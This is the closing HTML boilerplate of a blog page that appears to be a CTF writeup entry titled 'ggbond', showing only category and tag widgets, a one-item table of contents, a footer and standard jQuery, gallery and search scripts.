	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>52</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ggbond"><span class="toc-article-text">ggbond</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
